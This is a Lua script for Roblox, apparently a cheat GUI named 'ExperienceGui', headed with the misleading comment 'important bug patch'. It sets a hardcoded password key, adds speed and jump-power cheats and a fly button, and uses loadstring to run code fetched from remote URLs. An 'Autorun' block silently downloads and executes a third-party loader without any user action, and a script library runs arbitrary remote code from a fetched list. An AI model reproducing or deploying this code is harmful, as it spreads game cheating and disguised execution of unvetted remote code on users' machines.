-- important bug patch

local function StartExperienceGui()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    -- Load Rayfield
    local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

    -- Main Window
    local Window = Rayfield:CreateWindow({
        Name = "ExperienceGui",
        LoadingTitle = "ExperienceGui",
        LoadingSubtitle = "Made by CoolDown",
        ConfigurationSaving = { Enabled = true, FolderName = "ExperienceGui", FileName = "Config" },
        Discord = { Enabled = false },
        KeySystem = true,
        KeySettings = {
            Title = "ExperienceGui Access",
            Subtitle = "Enter Password",
            Note = "Password required to continue",
            FileName = "ExperienceKey",
            SaveKey = false,
            GrabKeyFromSite = false,
            Key = {"CoolDownExperience"}
        }
    })

    -- Tabs
    local HomeTab = Window:CreateTab("Home", 4483362458)
    local NeedsTab = Window:CreateTab("Basic Needs", 4483362458)
    local ScriptsTab = Window:CreateTab("Script Library", 4483362458)
    local AnnTab = Window:CreateTab("News", 4483362458)

    -- Home / Info
    HomeTab:CreateLabel("Welcome to ExperienceGui")
    HomeTab:CreateLabel("Made by CoolDown")
    HomeTab:CreateLabel("Client: " .. LocalPlayer.Name)
    HomeTab:CreateLabel("Version 2.03")

    -- Needs tab
    NeedsTab:CreateSlider({
        Name = "WalkSpeed",
        Range = {16, 200},
        Increment = 1,
        Suffix = " speed",
        CurrentValue = 16,
        Flag = "WalkSpeed",
        Callback = function(Value)
            LocalPlayer.Character.Humanoid.WalkSpeed = Value
        end,
    })

    NeedsTab:CreateSlider({
        Name = "JumpPower",
        Range = {50, 300},
        Increment = 5,
        Suffix = " power",
        CurrentValue = 50,
        Flag = "JumpPower",
        Callback = function(Value)
            LocalPlayer.Character.Humanoid.JumpPower = Value
        end,
    })

    NeedsTab:CreateButton({
        Name = "Enable Fly",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
        end,
    })

    -- Autorun
    task.defer(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/loader.lua", true))()
    end)

    -- Script Library
    local function LoadScriptLibrary()
        local success, result = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/ARandomDumDev/ExperienceGui/refs/heads/main/Scripts.txt", true)
        end)

        if not success then
            ScriptsTab:CreateLabel("‚ö†Ô∏è Failed to fetch Scripts.txt")
            warn("HTTP GET failed:", result)
            return
        end

        local scripts
        local decodeSuccess, decodeResult = pcall(function()
            return HttpService:JSONDecode(result)
        end)

        if not decodeSuccess then
            ScriptsTab:CreateLabel("‚ö†Ô∏è Failed to decode Scripts.txt")
            warn("JSON Decode failed:", decodeResult)
            return
        end

        scripts = decodeResult
        if type(scripts) ~= "table" or #scripts == 0 then
            ScriptsTab:CreateLabel("‚ö†Ô∏è No scripts found")
            return
        end

        for _, scriptData in ipairs(scripts) do
            ScriptsTab:CreateButton({
                Name = scriptData.name or "Unnamed Script",
                Callback = function()
                    if scriptData.url then
                        local ok, err = pcall(function()
                            loadstring(game:HttpGet(scriptData.url, true))()
                        end)
                        if not ok then warn("Failed to load script:", scriptData.name, err) end
                    elseif scriptData.code then
                        local ok, err = pcall(function()
                            loadstring(scriptData.code)()
                        end)
                        if not ok then warn("Failed to execute script:", scriptData.name, err) end
                    else
                        warn("No url or code found for script:", scriptData.name)
                    end
                end
            })
        end
    end

    task.defer(function()
        task.wait(1)
        pcall(LoadScriptLibrary)
    end)

    -- Announcements + Changelog
    local announcementsUrl = "https://raw.githubusercontent.com/ARandomDumDev/ExperienceGui/refs/heads/main/announcementsChangelogs.json"
    local announcementLabels = {}

    local function ClearOldLabels()
        for _, label in ipairs(announcementLabels) do
            label:Set("Text", "")
        end
        announcementLabels = {}
    end

    local function LoadAnnouncements()
        ClearOldLabels()

        local success, result = pcall(function()
            return game:HttpGet(announcementsUrl, true)
        end)

        if not success then
            table.insert(announcementLabels, AnnTab:CreateLabel("‚ö†Ô∏è Failed to fetch announcements"))
            warn("HTTP GET failed:", result)
            return
        end

        local data
        local decodeSuccess, decodeResult = pcall(function()
            return HttpService:JSONDecode(result)
        end)

        if not decodeSuccess then
            table.insert(announcementLabels, AnnTab:CreateLabel("‚ö†Ô∏è Failed to decode announcements"))
            warn("JSON Decode failed:", decodeResult)
            return
        end

        data = decodeResult

        if data.announcement then
            table.insert(announcementLabels, AnnTab:CreateLabel("üì¢ " .. data.announcement))
        else
            table.insert(announcementLabels, AnnTab:CreateLabel("üì¢ No announcement at this time"))
        end

        if data.changelog then
            table.insert(announcementLabels, AnnTab:CreateLabel("üìù " .. data.changelog))
        else
            table.insert(announcementLabels, AnnTab:CreateLabel("üìù No changelog available"))
        end
    end

    task.defer(function()
        while true do
            LoadAnnouncements()
            task.wait(60) -- refresh every 60s
        end
    end)
end

-- Call once
StartExperienceGui()
